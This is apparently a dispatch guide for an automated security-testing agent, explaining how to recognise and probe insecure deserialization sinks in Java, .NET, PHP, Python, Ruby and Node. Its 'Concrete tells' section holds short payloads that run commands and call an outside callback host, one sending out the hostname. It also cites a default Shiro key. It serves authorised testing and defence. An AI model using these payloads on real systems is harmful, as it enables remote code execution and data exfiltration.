# deserialization — when to use

## Trigger signals (dispatch this skill the moment you observe…)

- **A Base64 blob in a cookie/token/header that decodes to known magic bytes.** If `rO0AB...` (Java `ac ed 00 05`) → Java serialization. If `H4sIA...` → gzip-wrapped (often Java). If `AAEAAAD/////` → .NET BinaryFormatter. If `/wEP...` or a `__VIEWSTATE` field → ASP.NET LosFormatter/ObjectStateFormatter. If `gAJ`/`gAM`/`gAQ` → Python pickle proto 2+. If `BAg...` (`04 08`) → Ruby Marshal. If `O:8:"...` / `a:3:{...` / `s:5:"..."` → PHP `serialize()` output. Any of these → this skill applies.
- **`Content-Type: application/x-java-serialized-object`** on a request or response → explicit Java deserialization endpoint, dispatch immediately. Same for `application/x-amf` (Adobe AMF / Flash / BlazeDS).
- **A stack trace or 500 error containing `readObject`, `ObjectInputStream`, `unserialize()`, `pickle.loads`, `Marshal.load`, `yaml.load`, `Newtonsoft.Json`, `BinaryFormatter`, `LosFormatter`, or `ObjectStateFormatter`** after you tampered with an encoded value → the value is hitting a live deserializer.
- **`__VIEWSTATE`, `__VIEWSTATEGENERATOR`, `__EVENTVALIDATION` hidden fields** on an ASP.NET page → ViewState surface. If the page has no `__VIEWSTATEGENERATOR`-tied MAC or the app uses default/leaked machine keys, this is the highest-value .NET path.
- **A `JSESSIONID` or session cookie that Base64-decodes to `rO0AB`** → Java session-in-cookie (Tomcat `PersistentManager`), deserialized on every request.
- **A `rememberMe` cookie (Apache Shiro) or Spring Security `remember-me` cookie** → AES-encrypted serialized object; default Shiro key `kPH+bIxk5D2deZiIxcaaaA==` is widely deployed.
- **Any value that round-trips `decode → opaque blob → re-encode` unchanged** — flip one byte in the middle and the app errors or behaves differently → a deserializer is parsing it, not just echoing it.
- **A JSON body where injecting `$type` (`.NET`/Json.NET) or `@class`/polymorphic type hints (Jackson) changes parsing behaviour** → polymorphic typing enabled, arbitrary type instantiation possible.
- **A file upload that accepts `.ser`, `.phar`, `.pickle`, `.bin`, `.dat`, `.rdb`, or YAML**, or a PHP app where you can control a path passed to any filesystem function (`file_exists`, `getimagesize`, `fopen`, `is_dir`) → PHAR deserialization is reachable even with no visible `unserialize()`.
- **`node-serialize` `_$$ND_FUNC$$_` literal echoed or accepted in a JSON body** → near-instant Node RCE on deserialize.
- **Import/export, RPC, message-queue, JMX/RMI/T3/IIOP, or "restore from backup" endpoints** that take an opaque binary body → classic server-side deserialization sinks.

## Use-case scenarios

- **Stateful clients that "trust their own cookies."** Many frameworks serialize a session/identity object into a cookie or token and deserialize it back on each request. If the blob is not integrity-protected (no HMAC, or a known/default key), an attacker can substitute a gadget-chain object. This is the bread-and-butter surface: Shiro `rememberMe`, Java session cookies, Laravel `decrypt()` when `APP_KEY` leaks, signed-but-default ViewState.
- **ASP.NET ViewState.** Whenever you see `__VIEWSTATE`, evaluate it. If `enableViewStateMac="false"`, or the app uses a default/published `<machineKey>`, or a `web.config` disclosure leaks `validationKey`/`decryptionKey`, ViewState becomes a single-shot RCE via `LosFormatter`. This is one of the most reliable .NET footholds in the wild.
- **Polymorphic JSON APIs.** Modern apps love JSON, but Jackson `enableDefaultTyping()`/`@JsonTypeInfo` and Json.NET `TypeNameHandling != None` let attacker-supplied JSON pick which class to instantiate. The surface looks like a normal REST endpoint until you add a type hint.
- **PHP apps doing file operations on user paths.** PHAR deserialization means *any* filesystem call on a `phar://` URL triggers object reconstruction. So image processors, file-existence checks, and "preview this upload" features are deserialization sinks even though no `unserialize()` is visible in the obvious code path.
- **Python/Ruby internal tooling.** `pickle.loads`, `yaml.load` (unsafe), `marshal.loads`, `Marshal.load`, `YAML.load` are all instant code execution on untrusted bytes. Common in ML model loaders, caching layers, job queues, and "load this saved state" features.
- **Legacy enterprise middleware.** WebLogic (T3), JBoss, WebSphere, RMI registries, JMX consoles — historically riddled with `ObjectInputStream` sinks reachable pre-auth. If recon turns up these technologies on non-standard ports, this skill is the right move.
- **When `rce` finds an opaque-byte sink but not an obvious `eval`/command wrapper.** If the path to code execution runs *during reconstruction* (constructors, magic methods, custom readers) rather than through a string-eval, this skill — with its gadget-chain and format-fingerprinting focus — is the correct specialist over generic `rce`.

## Concrete tells (request → response examples)

- **Java URLDNS probe.** Send a `URLDNS` ysoserial blob (JDK-only, DNS-only, no code execution) to the suspected sink. → If your OAST DNS server logs a lookup, `readObject` is reachable and you can escalate to a real chain. No callback but a clean response = sink may be filtered (`ObjectInputFilter`) or not actually deserializing.
- **Byte-flip differential.** Take the original encoded value, truncate one byte from the middle, resend. → A 500 with `java.io.StreamCorruptedException`, `unserialize(): Error at offset`, `_pickle.UnpicklingError`, or `EOFError`/`Psych::SyntaxError` confirms a live deserializer. A normal 200 (value ignored) suggests it is opaque/echoed, not parsed.
- **PHP serialized tamper.** Given `O:4:"User":1:{s:4:"name";s:3:"bob";}`, change the property count or a type tag (`s:3` → `s:4`). → `Notice: unserialize(): Error at offset N` or a `__wakeup`/`__destruct` warning in the response confirms `unserialize()` on your input.
- **PHAR trigger.** Upload a polyglot (`phpggc -p phar -pj polyglot.jpg Monolog/RCE1 system id`) as an image, then hit any feature that does a filesystem op on it via `phar://`. → A DNS/HTTP callback (set the gadget command to `nslookup $RAND.oast.tld`) confirms metadata deserialization.
- **Json.NET `$type` probe.** Add `"$type":"System.Windows.Data.ObjectDataProvider, ...", ...` to a JSON body. → If the server reflects a "could not load type" / "type is not allowed" error mentioning the type name, `TypeNameHandling` is on and exploitable; a generic 400 with no type mention means it is likely `None`.
- **ViewState MAC test.** Send an unsigned ysoserial.net `LosFormatter` blob in `__VIEWSTATE`. → `Validation of viewstate MAC failed` confirms MAC is enabled (need the key); successful page render or code execution confirms it is unsigned/keyed with a default.
- **Python pickle oracle.** A class whose `__reduce__` returns `(os.system, ('nslookup $RAND.oast.tld',))` (~30 bytes) sent to a `pickle.loads` sink. → DNS callback proves execution. `find_class` restriction errors mean a guarded unpickler.
- **Node node-serialize.** `{"x":"_$$ND_FUNC$$_function(){require('child_process').exec('curl https://$RAND.oast.tld/$(hostname)')}()"}`. → Inbound HTTP with the hostname proves RCE on deserialize.

## When NOT to use it / easily-confused-with

- **Generic code-execution sinks → use `rce`, not this.** If user input lands in `eval()`, a shell command wrapper, or a process spawn directly (not via a serializer), that is plain command/code injection. This skill is specifically for *language-level deserializers* where the exploit hinges on serializer format and gadget chains.
- **A reflected/echoed blob is not deserialization.** If the server simply returns your serialized-looking value back in the response without parsing it, that is reflection (possibly XSS) — not a deserialization sink. Confirm with a byte-flip differential before dispatching.
- **A 500 with no controlled output is not proof.** A crash on malformed bytes could be an ordinary parser bug. Require a quiet oracle (DNS/HTTP/timing) showing code ran *during* reconstruction before treating it as deserialization RCE.
- **Template evaluation → SSTI, not this.** A value rendered through a template engine (`{{7*7}}` → `49`) is server-side template injection. Deserialization runs object reconstructors, not template expressions.
- **Safe loaders defeat it.** `yaml.safe_load`, `pickle` with a strict `find_class` allowlist, `JsonSerializer` without polymorphic typing, Java `ObjectInputFilter`/allowlists, and signed ViewState without a leaked key all neutralise the class — note them and route elsewhere rather than burning requests.
- **JSON parsing itself is safe.** `JSON.parse`, `json.loads`, and `DataContractJsonSerializer` without unsafe `KnownTypes` are not vulnerable on their own. The danger is only in libraries that *revive functions/classes/types* from JSON (Json.NET `TypeNameHandling`, Jackson default typing, `node-serialize`).
- **Plain auth/identity tampering → IDOR/auth-bypass skills.** If a cookie is a simple `userid=5` or an unsigned JWT, that is broken access control or JWT abuse — only route here when the tampered identity field lives inside a *serialized object graph*.
- **Go gob and similar.** Rarely direct RCE; impact is usually type-confusion, panic-DoS, or memory exhaustion. Do not over-prioritise unless a decoded type has reflectively-invoked methods.

B:deserialization done

